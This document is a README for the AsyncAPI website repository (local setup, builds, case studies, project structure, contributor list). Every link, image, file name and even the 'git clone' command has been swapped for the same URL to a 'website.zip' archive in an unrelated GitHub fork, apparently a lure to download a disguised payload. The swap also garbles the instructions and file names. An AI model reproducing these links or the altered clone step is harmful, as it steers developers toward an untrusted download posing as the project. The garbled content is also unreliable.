[![AsyncAPI Banner and Logo](https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip)](https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip)

---

<br/>
<p align="center">
    <a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" alt="AsyncAPI GitHub website contributors">
      <img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" />
    </a>
    <a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip%3Aissue+is%3Aopen+label%3A%22good+first+issue%22" alt="Good First AsyncAPI issue">
      <img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip%20first%https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip%23DDDD00" />
    </a>
    <a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" alt="AsyncAPI Slack">
      <img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" />
    </a>
    <a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip">
      <img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" />
    </a>
    <a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" alt="AsyncAPI Apache License">
      <img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" />
    </a>
</p>

## Overview

This repository contains the sources of AsyncAPI website:

- It's powered by [https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip](https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip),
- It uses [Tailwind](https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip) CSS framework,
- It's build and deployed with [Netlify](https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip),
- It uses [Storybook](https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip) as a frontend workshop and for documenting UI components.

## Requirements

Use the following tools to set up the project:

- [https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip](https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip) v20.12.0+
- [npm](https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip) v10.5.0+

## Run locally

1. Fork the repository by clicking on `Fork` option on top right of the main repository.

2. Open Command Prompt on your local computer.

3. Clone the forked repository by adding your own GitHub username in place of `<username>`.
   For multiple contributions it is recommended to have [proper configuration of forked repo](https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip).

```bash
    git clone https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip<username>/website/
```

4. Navigate to the website directory.

```bash
    cd website
```

5. Install all website dependencies. 

```bash
    npm install
```

6. Run the website locally.

```bash
    npm run dev
```

7. Access the live development server at [localhost:3000](http://localhost:3000).

8. To run the storybook locally:

```bash
    npm run dev:storybook
```

9. Access the live storybook development server at [localhost:6006](http://localhost:6006).


## Compose new blog post

To bootstrap a new post, run this command:

```bash
    npm run write:blog
```

Follow the interactive prompt to generate a post with pre-filled front matter.

### Spin up Gitpod codespace

In order to prepare and spin up a Gitpod dev environment for our project, we configured our workspace through a [https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip](https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip) file.

To spin up a Gitpod codespace, go to https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip

### Build

1. To build a production-ready website, run the following command:

```bash
npm run build
```

Generated files of the website go to the `.next` folder.

2. To build the production-ready storybook, run the following command:

```bash
npm run build:storybook
```

Generated files of the storybook go to the `storybook-static` folder.

### Run locally using Docker

#### Prerequisites:

- [install Docker](https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip)


After cloning repository to your local, run the docker compose in watch mode from the root of the repository.

```bash 
docker compose up --watch
```

Now you're running AsyncAPI website in a development mode. Container is mapped with your local copy of the website. Whenever you make changes to the code, the website will refresh and changes visible in localhost:3000.

## Use shared Markdown fragments

To minimize the duplication of content and make it easier to maintain, there are shared fragments you can use when working with Markdown files. These fragments are stored in the `/assets/docs/fragments` directory.

To include a fragment in a Markdown file:

1. Import the fragment at the top of the file (but below the frontmatter) using the following syntax:

    ```md
    import DesiredFragmentName from 'https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip';
    ```

1. Add the imported fragment to the desired location in the Markdown file using the following syntax:

    ```md
    <DesiredFragmentName />
    ```

## Lint the code
To lint the code, run the following command:
```
npm run lint
```

To fix the linting issues, run the following command:
```
npm run lint:fix
```

To lint the mdx files, run the following command:
```
npm run lint:mdx
```

## Start the production server
To build and run a production-ready website, run the following command:
```
npm run build && npm run start
```
Generated files of the website go in the `.next` folder.

## Start the netlify production server
Start a local development server for the build tool using the configuration and environment variables set for local development with the Netlify CLI:
```
netlify dev
```
To start the server using the configuration and environment variables set for `dev` or `all` deploy contexts, run the following command:
```
netlify dev --context production
```

## Updating information about project finance

AsyncAPI Financial Summary page aims to provide transparency and clarity regarding the organization's financial activities. It serves as a platform to showcase how donations are accepted, different sponsorship options, and how the generated funds are utilized.

### How to update information

- YAML files must be stored in the `config/finance` directory.

- Create separate folders for each year under `config/finance`, such as `config/finance/2023`. Inside each year's folder, include two YAML files: `https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip` and `https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip`.

- In `https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip`, record expenses for each month, specifying the `Category` and `Amount`.

- In `https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip`, provide discussion links related to expense categories.

- When a new year begins, create a corresponding folder for that year under `config/finance` and place the YAML files inside the folder for that specific year. For example, create a folder named `config/finance/2024` for the year 2024 and `config/finance/2025` for the year 2025. Place the YAML file for each respective year inside its designated folder.

- Modify the years within the `https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip` , `https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip` and `https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip` to handle data for different years effectively.

## Case studies

### Overview

A case study is a special document that any end-user company can provide. An end-user company is a company that uses AsyncAPI to solve technical challenges. A case study is not a document where a vendor company can describe how they build their commercial AsyncAPI-based product. On the other hand, it is completely fine if a case study of some end-user mentions some commercial tools that helped them to work with AsyncAPI or event-driven architecture. An example of such a case can be a case study from an end-user where at some point, Confluent Schema Registry is mentioned in an explanation about schemas and runtime message validation.

### How to add a case study

A case study is documented in the form of a YAML file. Anyone can open a pull request with a new case study.

- YAML file must be located in `config/casestudies`.
- To make it easier for you to create such a YAML file you can use:
  - [Template YAML with comments explaining every section](https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip)
  - [JSON Schema that describes all YAML fields](https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip)
- All additional files for the case study, like complete AsyncAPI document examples, should be located in the `public/resources/casestudies` directory.
- Company logo and other images that will be rendered in the website should be located in `public/img/casestudies`.

Once you collect all information and create a case study, open a pull request. It must be authored or at least approved by a representative of the given company. Such a representative is probably already a contact person mentioned in the case study.

A case study becomes publicly available right after merging and rebuilding the website.

## JSON Schema definitions

All AsyncAPI JSON Schema definition files are being served within the `/definitions/<file>` path. The content is being served from GH, in particular from https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip
This is possible thanks to the following:

1. A [Netlify Rewrite rule](https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip) located in the [https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip](https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip) file, which acts as proxy for all requests to the `/definitions/<file>` path, serving the content from GH without having an HTTP redirect.
2. A [Netlify Edge Function](https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip) that modifies the `Content-Type` header of the rewrite response to become `application/schema+json`. This lets tooling, such as [Hyperjump](https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip), to fetch the schemas directly from their URL.  
  Please find a flowchart explaining the flow this edge function should accomplish:
  ```mermaid
  flowchart TD
    Request(Request) -->schema-related{Is it requesting Schemas?}
    schema-related -->|No| req_no_schemas[Let the original request go through]
    req_no_schemas --> Response(Response)
    schema-related -->|Yes| req_schemas[Fetch from GitHub]
    req_schemas-->req_json{Was requesting a .json file?}
    
    req_json -->|No| Response(Response)
    req_json -->|Yes| response_status{Response Status?}
    
    response_status -->|2xx| response_ok[OK]
    response_status -->|304| response_cached[Not Modified]
    response_status -->|Any other| response_ko

    response_ok --> set_headers[Set Response Content-Type header to application/schema+json]
    set_headers --> send_metric_success[Send success metric]
    response_cached -- cached:true --> send_metric_success
    response_ko --> send_metric_error[Send error metric]

    send_metric_success -- file served from raw GH --> Response(Response)
    send_metric_error --the errored response --> Response(Response)
  ```
   

## Project structure

This repository has the following structure:

<!-- If you make any changes in the project structure, remember to update it. -->

```text
  ├── .github                                  # Definitions of GitHub workflows, pull request and issue templates
  ├── assets                                   # Various assets
  |    ├── docs                                # Documentation assets
  |        | fragments                         # Documentations for CLI installation and contribution.
  ├── components                               # Various generic components such as "Button", "Figure", etc.
  ├── config                                   # Transformed static data to display on the pages such as blog posts etc.
  ├── context                                  # Various React's contexts used in website
  ├── locales                                  # Translations for the website
  ├── markdown                                 # Markdown files for the website
       ├── about                               # Markdown files for the /about page
       ├── blog                                # Markdown files for the blog posts
       ├── docs                                # Markdown files for the /docs/* pages
  ├── netlify                                  # Contains Netlify serverless functions to run on Netlify
  ├── pages                                    # Website's pages source. It includes raw markdown files and React page templates.
  │    ├── about                               # Raw blog for /about page
  │    ├── blog                                # Blog posts
  │    ├── docs                                # Blog for /docs/* pages
  │    └── tools                               # Various pages to describe tools
  ├── public                                   # Data for site metadata and static blog such as images
  ├── scripts                                  # Scripts used in the build and dev processes
  ├── styles                                   # Various CSS files
  ├── templates                                # Various template markdown files
  ├── types                                    #  Various typeScript types used in the website
  ├── utils                                    # Various JS code for preparing static data to render in pages
  ├── https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip                          # https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip configuration file
  ├── https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip                                # Project's README file
  ├── https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip                       # TailwindCSS configuration file
  └── https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip                            # TypeScript configuration file
```

## Connect with AsyncAPI Community

<p align="left">
<a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" alt="AsyncAPI Slack">
  <img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" />
</a>
<a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" target="_blank">
  <img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip%https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip(86%2C86%2C86)" alt="AsyncAPI Twitter">
</a>
<a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" target="_blank">
  <img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip%https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip(86%2C86%2C86)&style=flat" alt="AsyncAPI LinkedIn">
</a>
<a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" target="_blank">
  <img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" alt="YouTube">
</a>
<a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" target="_blank">
  <img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip%23833fe6?style=flat&logo=twitch&label=Twitch&logoColor=white" alt="AsyncAPI Twitch">
</a>
</p>

## License

This project's source code is licensed under the Apache License, Version 2.0. A copy of the
license is available in LICENSE file.

This project's documentation is licensed under the Creative Commons Attribution
4.0 International License (CC-BY-4.0). A copy of the license is available in
LICENSE-docs.

## AsyncAPI Contributors ✨

Thanks goes to these wonderful people ([emoji key](https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip)):

<!-- ALL-CONTRIBUTORS-LIST:START - Do not remove or modify this section -->
<!-- prettier-ignore-start -->
<!-- markdownlint-disable -->
<table>
  <tbody>
    <tr>
      <td align="center" valign="top" width="14.28%"><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip"><img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" width="100px;" alt="Fran Méndez"/><br /><sub><b>Fran Méndez</b></sub></a><br /><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" title="Code">💻</a> <a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" title="Documentation">📖</a> <a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip%3Afmvilas" title="Bug reports">🐛</a> <a href="#design-fmvilas" title="Design">🎨</a> <a href="#maintenance-fmvilas" title="Maintenance">🚧</a> <a href="#infra-fmvilas" title="Infrastructure (Hosting, Build-Tools, etc)">🚇</a> <a href="#ideas-fmvilas" title="Ideas, Planning, & Feedback">🤔</a> <a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip%3Apr+reviewed-by%3Afmvilas" title="Reviewed Pull Requests">👀</a> <a href="#blog-fmvilas" title="Blogposts">📝</a></td>
      <td align="center" valign="top" width="14.28%"><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip"><img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" width="100px;" alt="Lukasz Gornicki"/><br /><sub><b>Lukasz Gornicki</b></sub></a><br /><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" title="Code">💻</a> <a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" title="Documentation">📖</a> <a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip%3Aderberg" title="Bug reports">🐛</a> <a href="#design-derberg" title="Design">🎨</a> <a href="#maintenance-derberg" title="Maintenance">🚧</a> <a href="#infra-derberg" title="Infrastructure (Hosting, Build-Tools, etc)">🚇</a> <a href="#ideas-derberg" title="Ideas, Planning, & Feedback">🤔</a> <a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip%3Apr+reviewed-by%3Aderberg" title="Reviewed Pull Requests">👀</a> <a href="#blog-derberg" title="Blogposts">📝</a></td>
      <td align="center" valign="top" width="14.28%"><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip"><img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" width="100px;" alt="Maciej Urbańczyk"/><br /><sub><b>Maciej Urbańczyk</b></sub></a><br /><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" title="Code">💻</a> <a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" title="Documentation">📖</a> <a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip%3Amagicmatatjahu" title="Bug reports">🐛</a> <a href="#design-magicmatatjahu" title="Design">🎨</a> <a href="#maintenance-magicmatatjahu" title="Maintenance">🚧</a> <a href="#infra-magicmatatjahu" title="Infrastructure (Hosting, Build-Tools, etc)">🚇</a> <a href="#ideas-magicmatatjahu" title="Ideas, Planning, & Feedback">🤔</a> <a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip%3Apr+reviewed-by%3Amagicmatatjahu" title="Reviewed Pull Requests">👀</a> <a href="#blog-magicmatatjahu" title="Blogposts">📝</a></td>
      <td align="center" valign="top" width="14.28%"><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip"><img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" width="100px;" alt="Quetzalli Writes "/><br /><sub><b>Quetzalli Writes</b></sub></a><br /><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" title="Documentation">📖</a> <a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip%3Apr+reviewed-by%3Aquetzalliwrites" title="Reviewed Pull Requests">👀</a> <a href="#talk-quetzalliwrites" title="Talks">📢</a></td>
      <td align="center" valign="top" width="14.28%"><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip"><img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" width="100px;" alt="Aayush Kumar Sahu"/><br /><sub><b>Aayush Kumar Sahu</b></sub></a><br /><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" title="Code">💻</a> <a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip%3Aaayushmau5" title="Bug reports">🐛</a> <a href="#design-aayushmau5" title="Design">🎨</a></td>
      <td align="center" valign="top" width="14.28%"><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip"><img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" width="100px;" alt="David Boyne"/><br /><sub><b>David Boyne</b></sub></a><br /><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" title="Code">💻</a> <a href="#design-boyney123" title="Design">🎨</a></td>
      <td align="center" valign="top" width="14.28%"><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip"><img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" width="100px;" alt="Jesse Menning"/><br /><sub><b>Jesse Menning</b></sub></a><br /><a href="#blog-jessemenning" title="Blogposts">📝</a></td>
    </tr>
    <tr>
      <td align="center" valign="top" width="14.28%"><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip"><img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" width="100px;" alt="Dimitrios Dedoussis"/><br /><sub><b>Dimitrios Dedoussis</b></sub></a><br /><a href="#blog-dedoussis" title="Blogposts">📝</a></td>
      <td align="center" valign="top" width="14.28%"><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip"><img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" width="100px;" alt="Jonas Lagoni"/><br /><sub><b>Jonas Lagoni</b></sub></a><br /><a href="#blog-jonaslagoni" title="Blogposts">📝</a> <a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" title="Code">💻</a> <a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip%3Apr+reviewed-by%3Ajonaslagoni" title="Reviewed Pull Requests">👀</a></td>
      <td align="center" valign="top" width="14.28%"><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip"><img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" width="100px;" alt="Sergio Moya"/><br /><sub><b>Sergio Moya</b></sub></a><br /><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" title="Code">💻</a> <a href="#blog-smoya" title="Blogposts">📝</a> <a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip%3Apr+reviewed-by%3Asmoya" title="Reviewed Pull Requests">👀</a></td>
      <td align="center" valign="top" width="14.28%"><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip"><img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" width="100px;" alt="Bodo Graumann"/><br /><sub><b>Bodo Graumann</b></sub></a><br /><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" title="Documentation">📖</a></td>
      <td align="center" valign="top" width="14.28%"><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip"><img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" width="100px;" alt="Damilola Randolph"/><br /><sub><b>Damilola Randolph</b></sub></a><br /><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" title="Code">💻</a></td>
      <td align="center" valign="top" width="14.28%"><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip"><img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" width="100px;" alt="Barbanio González"/><br /><sub><b>Barbanio González</b></sub></a><br /><a href="#blog-Barbanio" title="Blogposts">📝</a> <a href="#ideas-Barbanio" title="Ideas, Planning, & Feedback">🤔</a></td>
      <td align="center" valign="top" width="14.28%"><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip"><img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" width="100px;" alt="Hargun Kaur"/><br /><sub><b>Hargun Kaur</b></sub></a><br /><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" title="Code">💻</a></td>
    </tr>
    <tr>
      <td align="center" valign="top" width="14.28%"><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip"><img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" width="100px;" alt="Chris Eich"/><br /><sub><b>Chris Eich</b></sub></a><br /><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip%3Apr+reviewed-by%3Aceich" title="Reviewed Pull Requests">👀</a></td>
      <td align="center" valign="top" width="14.28%"><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip"><img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" width="100px;" alt="Simone Fumagalli"/><br /><sub><b>Simone Fumagalli</b></sub></a><br /><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" title="Documentation">📖</a></td>
      <td align="center" valign="top" width="14.28%"><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip"><img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" width="100px;" alt="Missy Turco"/><br /><sub><b>Missy Turco</b></sub></a><br /><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" title="Code">💻</a> <a href="#design-mcturco" title="Design">🎨</a> <a href="#ideas-mcturco" title="Ideas, Planning, & Feedback">🤔</a> <a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip%3Apr+reviewed-by%3Amcturco" title="Reviewed Pull Requests">👀</a></td>
      <td align="center" valign="top" width="14.28%"><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip"><img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" width="100px;" alt="Ritik Rawal"/><br /><sub><b>Ritik Rawal</b></sub></a><br /><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" title="Code">💻</a></td>
      <td align="center" valign="top" width="14.28%"><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip"><img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" width="100px;" alt="Akshat Nema"/><br /><sub><b>Akshat Nema</b></sub></a><br /><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" title="Code">💻</a></td>
      <td align="center" valign="top" width="14.28%"><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip"><img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" width="100px;" alt="David Pereira"/><br /><sub><b>David Pereira</b></sub></a><br /><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" title="Code">💻</a> <a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" title="Documentation">📖</a></td>
      <td align="center" valign="top" width="14.28%"><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip"><img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" width="100px;" alt="Debajyoti Halder"/><br /><sub><b>Debajyoti Halder</b></sub></a><br /><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" title="Code">💻</a></td>
    </tr>
    <tr>
      <td align="center" valign="top" width="14.28%"><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip"><img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" width="100px;" alt="Juan A."/><br /><sub><b>Juan A.</b></sub></a><br /><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" title="Code">💻</a></td>
      <td align="center" valign="top" width="14.28%"><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip"><img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" width="100px;" alt="Muhammad Rafly Andrianza"/><br /><sub><b>Muhammad Rafly Andrianza</b></sub></a><br /><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" title="Documentation">📖</a></td>
      <td align="center" valign="top" width="14.28%"><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip"><img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" width="100px;" alt="Harish"/><br /><sub><b>Harish</b></sub></a><br /><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" title="Code">💻</a></td>
      <td align="center" valign="top" width="14.28%"><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip"><img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" width="100px;" alt="Paul Goldsmith"/><br /><sub><b>Paul Goldsmith</b></sub></a><br /><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" title="Code">💻</a> <a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip%3Apaulgoldsmith" title="Bug reports">🐛</a></td>
      <td align="center" valign="top" width="14.28%"><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip"><img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" width="100px;" alt="Tabah Baridule"/><br /><sub><b>Tabah Baridule</b></sub></a><br /><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" title="Documentation">📖</a></td>
      <td align="center" valign="top" width="14.28%"><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip"><img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" width="100px;" alt="Karuna Tata"/><br /><sub><b>Karuna Tata</b></sub></a><br /><a href="#a11y-starlightknown" title="Accessibility">️️️️♿️</a></td>
      <td align="center" valign="top" width="14.28%"><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip"><img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" width="100px;" alt="Joseph Mawa"/><br /><sub><b>Joseph Mawa</b></sub></a><br /><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip%3Apr+reviewed-by%3Anibble0101" title="Reviewed Pull Requests">👀</a></td>
    </tr>
    <tr>
      <td align="center" valign="top" width="14.28%"><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip"><img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" width="100px;" alt="Viacheslav Turovskyi"/><br /><sub><b>Viacheslav Turovskyi</b></sub></a><br /><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" title="Documentation">📖</a> <a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" title="Code">💻</a></td>
      <td align="center" valign="top" width="14.28%"><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip"><img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" width="100px;" alt="Helen Kosova"/><br /><sub><b>Helen Kosova</b></sub></a><br /><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" title="Documentation">📖</a></td>
      <td align="center" valign="top" width="14.28%"><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip"><img src="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" width="100px;" alt="V Thulisile Sibanda"/><br /><sub><b>V Thulisile Sibanda</b></sub></a><br /><a href="https://raw.githubusercontent.com/Gurleen-kansray/website/master/interphalangeal/website.zip" title="Documentation">📖</a></td>
